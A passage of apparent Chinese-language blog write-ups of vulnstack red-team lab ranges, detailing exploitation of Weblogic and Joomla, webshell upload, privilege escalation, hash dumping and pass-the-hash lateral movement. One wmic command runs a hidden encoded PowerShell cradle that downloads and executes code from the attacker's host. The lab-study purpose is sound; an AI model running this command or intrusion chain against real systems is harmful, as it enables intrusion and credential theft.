src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815205413959.png" alt="image-20210815205413959"></p><p>在打下来的WEB服务器中架设Pivot</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815205239427.png" alt="image-20210815205239427"></p><p>之后使用MS15-051进行提权</p><p>提权完成后通过beacon命令</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p>导出目标机上的Hash</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815222624985.png" alt="image-20210815222624985"></p><p>并尝试传递哈希进行横向移动</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815205501770.png" alt="image-20210815205501770"></p><p>这里一直尝试失败，几次无果后尝试通过破解Hash的方式进行横向移动，发现是空密码。Windows中的密码一般有LM Hash和NTLM</p><p>Hash，一般来说LM Hash会被默认禁用，但这里是NTLM Hash，居然也是空密码。这里原因未知，可能是hashdump本身命令的原因，占个坑，将来懂了再来写。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815222724451.png" alt="image-20210815222724451"></p><p>几番尝试后，发现可以使用梼杌导出全部域用户的Hash（使用mimikatz也可以）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815222534895.png" alt="image-20210815222534895"></p><p>这个Hash在后面的测试中是可以传递成功的</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210816105238110.png" alt="image-20210816105238110"></p><p>之后尝试使用msf进行同样的hashdump操作，msf倒是表现得比较好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815222744934.png" alt="image-20210815222744934"></p><p>之后创建一个smb类型的listener（这里必须要使用smb，不能用http，原因未知）</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815222859281.png" alt="image-20210815222859281"></p><p>尝试进行PTH，并将我们拿到的不是空字符串的Hash填入，并配置域名、Listener和Session</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815223007953.png" alt="image-20210815223007953"></p><p>点击Launch后就能拿到相应主机的Beacon</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80.assets/image-20210815223057238.png" alt="image-20210815223057238"></p><p>对其他机器的渗透同理。进行两次PTH操作后就能拿到所有主机的权限。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>vulstack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队评估三记录</title>
    <link href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/"/>
    <url>/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机下载地址  <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</a></p><p>将虚拟机下载下来后按照官方说明配置好网络环境即可开始测试</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/QQ%E6%88%AA%E5%9B%BE20191111232827.png" alt="img"></p><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><h3 id="0x01-WEB信息收集"><a href="#0x01-WEB信息收集" class="headerlink" title="0x01 WEB信息收集"></a>0x01 WEB信息收集</h3><p>查看靶机WEB服务，发现是Joomla CMS搭建的demo站点</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816172353399.png" alt="image-20210816172353399"></p><p>扫描目录得到配置文件的备份configuration.php~</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816184102367.png" alt="image-20210816184102367"></p><p>在其中翻到后端数据库的用户名和密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816184332797.png" alt="image-20210816184332797"></p><p>同时端口扫描发现数据库服务可以外联</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816184414435.png" alt="image-20210816184414435"></p><p>尝试用得到的账户密码登录，连接成功</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816184532615.png" alt="image-20210816184532615"></p><h3 id="0x02-添加管理员账户登入后台"><a href="#0x02-添加管理员账户登入后台" class="headerlink" title="0x02 添加管理员账户登入后台"></a>0x02 添加管理员账户登入后台</h3><p>尝试破解后台管理员账户，发现不是常规的加密。遂放弃，尝试在官方文档中找到破局的思路。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816185925225.png" alt="image-20210816185925225"></p><p>访问官网查文档。发现有可以添加管理员的方法</p><p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F</a></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816185901218.png" alt="image-20210816185901218"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `am2zu_users`<br>   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;Administrator2&#x27;</span>, <span class="hljs-string">&#x27;admin2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, NOW(), NOW(), NOW());<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `am2zu_user_usergroup_map` (`user_id`,`group_id`)<br><span class="hljs-keyword">VALUES</span> (LAST_INSERT_ID(),<span class="hljs-string">&#x27;8&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这里要注意的是根据官方文档的说法，需要更改后缀为<code>_user</code>的表，但是在数据库中有两个这样的表。。</p><p>尝试后发现是<code>am2zu_users</code>表在起作用</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816190331640.png" alt="image-20210816190331640"></p><p>之后使用添加的账号密码成功登录</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816190439850.png" alt="image-20210816190439850"></p><h3 id="0x03-上传WebShell"><a href="#0x03-上传WebShell" class="headerlink" title="0x03 上传WebShell"></a>0x03 上传WebShell</h3><p>在 控制栏—-&gt;Extensions—-&gt;Templates—-&gt;Templates 处修改模板，添加一句话木马</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816192037878.png" alt="image-20210816192037878"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816192006916.png" alt="image-20210816192006916"></p><p>使用蚁剑连接成功</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816191944567.png" alt="image-20210816191944567"></p><h3 id="0x04-Bypass-disable-function-amp-横向移动"><a href="#0x04-Bypass-disable-function-amp-横向移动" class="headerlink" title="0x04 Bypass disable_function&amp;横向移动"></a>0x04 Bypass disable_function&amp;横向移动</h3><p>在尝试执行命令的时候发现设置了<code>disable_functions</code></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816192446323.png" alt="image-20210816192446323"></p><p>遂使用蚁剑的<code>bypass_disable_functions</code>插件进行绕过，这里使用的绕过方式是<code>Json Serializer UAF</code></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816192458515.png" alt="image-20210816192458515"></p><p>一番搜索后在<code>/tmp/mysql/test.txt</code>中发现了可以利用的信息</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816193510513.png" alt="image-20210816193510513"></p><p>一番尝试后，使用该账号密码登上了Centos机器</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816194139828.png" alt="image-20210816194139828"></p><h3 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h3><p>登陆后没有收集到更多有用信息，遂尝试提权。在查看内核版本号后发现该内核受脏牛提权漏洞的影响</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210816194418550.png" alt="image-20210816194418550"></p><p>上传exp</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817181602263.png" alt="image-20210817181602263"></p><p>编译执行</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817182019232.png" alt="image-20210817182019232"></p><p>获得root权限</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817182121512.png" alt="image-20210817182121512"></p><p>使用msf的<code>web_delivery</code>模块获得meterpreter</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817182842950.png" alt="image-20210817182842950"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817183130264.png" alt="image-20210817183130264"></p><h3 id="0x06-内网横向移动"><a href="#0x06-内网横向移动" class="headerlink" title="0x06 内网横向移动"></a>0x06 内网横向移动</h3><p>添加路由并对局域网段进行扫描</p><p>P.S. 其实不用添加路由，攻击机本身就有192.168.93.1的地址。但随手就加上了</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817183335268.png" alt="image-20210817183335268"></p><p>使用<code>auxiliary/scanner/smb/smb_version</code>对域内存活的主机和版本号进行然侧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[+] 192.168.93.10:445     -   Host is running Windows 2012 R2 Datacenter (build:9600) (name:WIN-8GA56TNV3MV) (domain:TEST)<br>[*] 192.168.93.20:139     - SMB Detected (versions:) (preferred dialect:) (signatures:optional)<br>[+] 192.168.93.30:445     -   Host is running Windows 7 Professional SP1 (build:7601) (name:WIN7) (domain:TEST)<br></code></pre></td></tr></table></figure><p>并尝试使用ms17-010进行横向移动，未果</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817191837622.png" alt="image-20210817191837622"></p><p>只能尝试对SMB模块进行爆破，这里不知道为什么msf和这台机器的连接一直出问题，卡了好久</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817203845663.png" alt="image-20210817203845663"></p><p>最后切到hydra进行爆破，得到口令</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210817203828385.png" alt="image-20210817203828385"></p><p>这里使用msf进行hash传递时依旧失败。只能使用<code>exploit/multi/script/web_delivery</code>模块配合wmic进行上线</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818104454531.png" alt="image-20210818104454531"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic /node:<span class="hljs-number">192.168</span>.<span class="hljs-number">93.20</span> /user:administrator /password:<span class="hljs-number">123</span>qwe!ASD <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABuAHAAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbgBwAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbgBwAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADkAMwAuADEAOgA4ADkANwA2AC8AQwB5ADEAcQBPAHQARwBZAEcAMQBCAFoANQA5ADcALwBqAGYAMwAzAGsATgBKAE4AcQB0AEkAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA5ADMALgAxADoAOAA5ADcANgAvAEMAeQAxAHEATwB0AEcAWQBHADEAQgBaADUAOQA3ACcAKQApADsA&quot;</span><br></code></pre></td></tr></table></figure><p>执行成功后即可得到meterpreter</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818104710719.png" alt="image-20210818104710719"></p><p>之后提权，加载mimikatz，导出凭据，可以拿到明文密码</p><p>这里需要注意的是，&#x3D;&#x3D;该虚拟机不能关闭，只能暂停，否则重启后域管理员的登录凭据将消失，抓不到了&#x3D;&#x3D;。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818105527755.png" alt="image-20210818105527755"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818105434992.png" alt="image-20210818105434992"></p><p>使用明文密码进行PTH操作，拿到域控的Meterpreter</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818105913166.png" alt="image-20210818105913166"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818105923964.png" alt="image-20210818105923964"></p><p>对PC机同理，不过该机没有接入域，使用的是拿到的第一个密码</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818110256434.png" alt="image-20210818110256434"></p><h3 id="0x07-拿到Flag"><a href="#0x07-拿到Flag" class="headerlink" title="0x07 拿到Flag"></a>0x07 拿到Flag</h3><p>想找flag的话，图形界面会比较方便。所以最后上线了CS，用CS的文件浏览功能寻找flag</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818114746878.png" alt="image-20210818114746878"></p><p>最后在<code>C:\Users\Administrator\Documents</code>下找到了flag.txt</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818115730694.png" alt="image-20210818115730694"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89.assets/image-20210818115529730.png" alt="image-20210818115529730"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>vulstack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队评估二记录</title>
    <link href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/"/>
    <url>/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶场下载地址</p><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p><p>根据平台介绍，虚拟机的密码统一为1qaz@WSX</p><p>将虚拟机导入后更改WEB靶机的IPV4地址为你所使用的NAT网段中的任意地址</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815102516563.png" alt="image-20210815102516563"></p><p>这里注意可能一开始WEB靶机的账号密码不对，方法是使用Administrator账号登录，然后改回来即可</p><p>在目录</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Oracle\Middleware\user_projects\domains\base_domain<br></code></pre></td></tr></table></figure><p>下有startWeblogic.bat，双击即可启动WEB环境</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815102845095.png" alt="image-20210815102845095"></p><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><p>访问站点，发现是经典的Weblogic界面</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815095858769.png" alt="image-20210815095858769"></p><p>使用工具探测CVE-2017-10271漏洞，发现存在漏洞</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815102954058.png" alt="image-20210815102954058"></p><p>上传冰蝎马并连接</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815103111042.png" alt="image-20210815103111042"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815095828856.png" alt="image-20210815095828856"></p><p>使用CS生成Payload并用冰蝎执行命令，上线CS</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815100840291.png" alt="image-20210815100840291"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815103207059.png" alt="image-20210815103207059"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815100906815.png" alt="image-20210815100906815"></p><p>上线后与WEB靶机进行交互，查看域环境：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> net time /domain</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101040134-1629033391543.png" alt="image-20210815101040134"></p><p>查看网络配置，发现WEB靶机配置有双网卡，存在内网环境</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> ipconfig</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101204281.png" alt="image-20210815101204281"></p><p>使用命令</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> computers<br></code></pre></td></tr></table></figure><p>查看网络环境中存活的机器，得到如下三个结果</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101135033.png" alt="image-20210815101135033"></p><p>之后尝试导出NTLM Hash，首先使用MS15-051进行提权</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101429191.png" alt="image-20210815101429191"></p><p>获得System权限的Beacon</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101458922.png" alt="image-20210815101458922"></p><p>成功导出Hash</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815103824568.png" alt="image-20210815103824568"></p><p>之后在WEB靶机上配置端口转发</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101603770.png" alt="image-20210815101603770"></p><p>并尝试进行横向移动，在CS的</p><p>View—&gt;Target</p><p>下使用psexec模块尝试进行横向移动</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101742025.png" alt="image-20210815101742025"></p><p>注意配置好域名和Listener，点击运行后CS会执行一系列的活动，如使用mimikatz进行PTH操作，最终我们就能拿到PC靶机的Beacon</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815102042751.png" alt="image-20210815102042751"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815104351770.png" alt="image-20210815104351770"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815101957244.png" alt="image-20210815101957244"></p><p>对于域控也是一样的，这里就不再赘述</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/12/img/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C.assets/image-20210815102200490.png" alt="image-20210815102200490"></p><p>自此，三个靶机全部拿下。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>vulstack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队评估五记录</title>
    <link href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94/"/>
    <url>/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94/</url>
    
